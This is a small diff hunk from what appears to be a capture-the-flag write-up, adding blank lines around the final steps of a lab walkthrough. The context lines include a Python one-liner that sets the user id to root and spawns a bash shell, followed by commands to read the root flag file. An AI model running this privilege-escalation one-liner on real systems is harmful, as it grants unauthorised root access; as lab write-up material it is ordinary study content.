@@ -122,7 +122,9 @@ python3.8 -c 'import os; os.setuid(0); os.system("bash")’
 whoami
 
 Cd /root
+
 ls
+
 Cat root.txt
 
 ![Screenshot 2024-11-10 124030](https://github.com/user-attachments/assets/42b5f893-9da5-46d5-86d3-6b3367fbe5ad)
